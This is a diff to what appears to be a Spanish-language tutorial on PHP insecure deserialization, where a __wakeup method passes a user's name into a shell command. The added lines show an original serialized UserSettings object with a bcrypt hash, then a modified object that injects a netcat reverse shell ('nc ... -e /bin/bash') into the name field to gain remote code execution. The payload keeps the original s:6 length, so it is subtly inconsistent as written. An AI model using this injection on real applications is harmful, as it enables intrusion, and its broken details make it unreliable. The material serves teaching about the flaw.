@@ -46,4 +46,12 @@ Supongamos que tenemos el siguiente código que recibe un objeto serializado:
 
 Vemos que la función __wakeup es utilizada para deserializar y asentar esto en un log por medio de la ejecución de código en la terminal y que invoca al atributo NAME del objeto.
 
+Podríamos entonces modificar el value del name del objeto para crear una shell reversa y conseguir RCE:
 
+##### Objeto serializado:
+
+       O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:6:"porota";s:31:"App\Helpers\UserSettingsEmail";s:17:"porota@porota.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$rhsxRw1X8gpBNhIaMVK9g.jREhfEqNWrNpIGxTpLry1nn8vp8YGXC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
+
+##### Objeto modificado con inyección de codigo:
+
+       O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:6:"; nc -nv 127.0.0.1 9999 -e /bin/bash;#";s:31:"App\Helpers\UserSettingsEmail";s:17:"porota@porota.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$rhsxRw1X8gpBNhIaMVK9g.jREhfEqNWrNpIGxTpLry1nn8vp8YGXC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
